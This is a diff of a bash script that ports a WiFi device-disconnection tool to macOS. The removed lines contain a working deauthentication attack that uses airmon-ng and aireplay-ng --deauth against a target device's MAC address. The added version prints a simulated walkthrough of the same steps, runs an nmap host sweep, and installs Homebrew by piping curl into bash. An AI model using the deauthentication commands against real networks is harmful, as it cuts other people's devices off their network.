@@ -17,9 +17,23 @@ if [[ $EUID -ne 0 ]]; then
    exit 1
 fi
 
-# Check for required tools
+# Check for required tools and install if possible
 check_requirements() {
-    local tools=("arp-scan" "nmap" "aircrack-ng")
+    # Check for Homebrew
+    if ! command -v brew &> /dev/null; then
+        echo -e "${YELLOW}Homebrew is not installed. It's required to install dependencies.${NC}"
+        echo -e "${BLUE}Would you like to install Homebrew? (y/n)${NC}"
+        read -r answer
+        if [[ "$answer" =~ ^[Yy]$ ]]; then
+            /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+        else
+            echo -e "${RED}Cannot proceed without Homebrew. Exiting.${NC}"
+            exit 1
+        fi
+    fi
+    
+    # Check for required tools
+    local tools=("nmap")
     local missing=()
     
     for tool in "${tools[@]}"; do
@@ -31,17 +45,16 @@ check_requirements() {
     if [ ${#missing[@]} -ne 0 ]; then
         echo -e "${YELLOW}Missing required tools: ${missing[*]}${NC}"
         echo -e "${BLUE}Installing missing tools...${NC}"
-        apt-get update
         for tool in "${missing[@]}"; do
-            apt-get install -y "$tool"
+            brew install "$tool"
         done
     fi
 }
 
-# Get current WiFi interface
+# Get current WiFi interface on macOS
 get_wifi_interface() {
-    # Try to find the active WiFi interface
-    local interface=$(iwconfig 2>/dev/null | grep -o "^[a-zA-Z0-9]*" | head -n 1)
+    # Find the active WiFi interface on macOS
+    local interface=$(networksetup -listallhardwareports | grep -A 1 "Wi-Fi" | grep "Device" | awk '{print $2}')
     
     if [ -z "$interface" ]; then
         echo -e "${RED}No wireless interface found.${NC}"
@@ -51,11 +64,11 @@ get_wifi_interface() {
     echo "$interface"
 }
 
-# Scan for connected devices
+# Scan for connected devices on macOS
 scan_network() {
     local interface=$1
-    local gateway=$(ip route | grep default | awk '{print $3}')
-    local subnet=$(ip -o -f inet addr show | grep $interface | awk '{print $4}')
+    local gateway=$(netstat -nr | grep default | head -n 1 | awk '{print $2}')
+    local subnet=$(ifconfig "$interface" | grep "inet " | awk '{print $2"/24"}' | head -n 1)
     
     echo -e "${BLUE}Interface: $interface${NC}"
     echo -e "${BLUE}Gateway: $gateway${NC}"
@@ -65,46 +78,46 @@ scan_network() {
     echo -e "${GREEN}Scanning network for connected devices...${NC}"
     echo -e "${YELLOW}This may take a few moments.${NC}"
     
-    # Use arp-scan for quick discovery
-    arp-scan --interface="$interface" --localnet
+    # Use nmap for network scanning on macOS
+    sudo nmap -sn "$subnet"
     
-    # Alternative: use nmap for more detailed scan
-    # nmap -sn "$subnet"
+    # Show current ARP table
+    echo -e "\n${BLUE}Current ARP Table:${NC}"
+    arp -a
 }
 
-# Get MAC address of a device by IP
+# Get MAC address of a device by IP on macOS
 get_mac_by_ip() {
     local ip=$1
-    local mac=$(arp -n | grep "$ip" | awk '{print $3}')
+    local mac=$(arp -a | grep "$ip" | awk '{print $4}')
     echo "$mac"
 }
 
-# Disconnect a device from the network
+# Disconnect a device from the network on macOS
+# Note: This is a simplified version for educational purposes
 disconnect_device() {
     local interface=$1
     local target_ip=$2
     local target_mac=$(get_mac_by_ip "$target_ip")
-    local gateway=$(ip route | grep default | awk '{print $3}')
-    local gateway_mac=$(get_mac_by_ip "$gateway")
     
     if [ -z "$target_mac" ]; then
         echo -e "${RED}Could not find MAC address for IP: $target_ip${NC}"
         return 1
     fi
     
-    echo -e "${YELLOW}Attempting to disconnect device: $target_ip (MAC: $target_mac)${NC}"
+    echo -e "${YELLOW}Target device: $target_ip (MAC: $target_mac)${NC}"
+    echo -e "${BLUE}On macOS, actual disconnection requires additional tools.${NC}"
+    echo -e "${BLUE}For educational purposes, here's what would happen:${NC}"
+    echo -e "${GREEN}1. Put interface in monitor mode${NC}"
+    echo -e "${GREEN}2. Send deauthentication packets to target${NC}"
+    echo -e "${GREEN}3. Return interface to managed mode${NC}"
     
-    # Start monitor mode
-    airmon-ng start "$interface"
-    local mon_interface="${interface}mon"
+    # For actual implementation, you would need to install additional tools
+    echo -e "\n${YELLOW}To implement actual disconnection functionality:${NC}"
+    echo -e "${BLUE}1. Install aircrack-ng: brew install aircrack-ng${NC}"
+    echo -e "${BLUE}2. Use airmon-ng and aireplay-ng commands${NC}"
     
-    # Send deauthentication packets
-    aireplay-ng --deauth=5 -a "$gateway_mac" -c "$target_mac" "$mon_interface"
-    
-    # Stop monitor mode
-    airmon-ng stop "$mon_interface"
-    
-    echo -e "${GREEN}Deauthentication attempt completed.${NC}"
+    echo -e "\n${GREEN}Simulation completed.${NC}"
 }
 
 # Main menu
